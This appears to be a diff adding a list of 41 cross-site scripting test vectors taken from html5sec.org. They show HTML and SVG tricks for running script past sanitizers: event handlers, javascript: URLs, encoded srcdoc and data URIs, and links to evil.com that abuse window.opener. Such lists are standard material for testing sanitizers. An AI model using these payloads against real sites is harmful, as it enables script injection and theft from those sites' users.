@@ -1,0 +1,89 @@
+#  vectors from https://html5sec.org/
+
+1. <input onfocus=alert(1) autofocus>
+
+2. <input onblur=alert(1) autofocus><input autofocus>
+
+3. <body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+
+4. <video><source onerror="alert(1)"><video>
+
+5. <form><button formaction="javascript:alert(1)">X</button>
+
+6. <body oninput=alert(1)><input autofocus>
+
+7. <link rel="import" href="http://evil.com/xss.svg" />
+
+8. <iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />
+
+9. <picture><source srcset="x"><img onerror="alert(1)"></picture>
+
+10. <picture><img srcset="x" onerror="alert(1)"></picture>
+
+11. <img srcset=",,,,,x" onerror="alert(1)">
+
+12. <a href="//evil.com" target="_blank" rel="noreferrer">CLICK</a>
+
+13. <map><area href="//evil.com" target="_blank" rel="noreferrer">CLICK</area></map>
+
+14. <svg><a xlink:href="//evil.com" rel="noreferrer">CLICK</a></svg> // window.opener still works
+
+15. <form action="//evil.com" target="_blank" rel="noreferrer"><input type="submit"></form>// window.opener still works
+
+16. <form id="test" rel="noreferrer"></form><button form="test" formtarget="_blank" formaction="//evil.com">CLICKME</button>// window.opener still works
+
+17. <math href="//evil.com" xlink:show="new" rel="noreferrer">CLICKME</math>// window.opener still works
+
+18. <iframe srcdoc="<svg onload=alert(1)&nvgt;"></iframe>
+
+19. <a href="javascript:&apos;<svg onload&equals;alert&lpar;1&rpar;&nvgt;&apos;">CLICK</a>
+
+20. <div onfocus="alert(1)" contenteditable tabindex="0" id="xss"></div>
+
+21. <div style="-webkit-user-modify:read-write" onfocus="alert(1)" id="xss">
+
+22. <div style="-webkit-user-modify:read-write-plaintext-only" onfocus="alert(1)" id="xss">
+
+23. <div style="animation-name:x" onanimationstart="alert(1)"></div>
+
+24. <details open ontoggle="alert(1)">
+
+25. <frameset onload=alert(1)>
+
+26. <!--<img src="--><img src=x onerror=alert(1)//">
+
+27. <style><img src="</style><img src=x onerror=alert(1)//">
+
+28. <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+
+29. <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+
+30. <img[a][b]src=x[d]onerror[c]=[e]"alert(1)">
+
+31. <a href="[a]java[b]script[c]:alert(1)">XXX</a>
+
+32. <frameset onpageshow="alert(1)">
+
+33. <body onpageshow="alert(1)">
+
+34. <a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">XXX</a></a><a href="javascript:alert(2)">XXX</a>
+
+35. <script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>
+
+36. <svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
+
+37. <svg xmlns="http://www.w3.org/2000/svg">
+    <a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="1000" height="1000" fill="white"/></a>
+    </svg>
+
+38. <svg>
+    <a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">
+    <circle r="400"></circle>
+    <animate attributeName="xlink:href" begin="0" from="javascript:alert(1)" to="&" />
+    </a>
+
+39. <script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script>
+
+40. <script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>
+
+41. <iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>
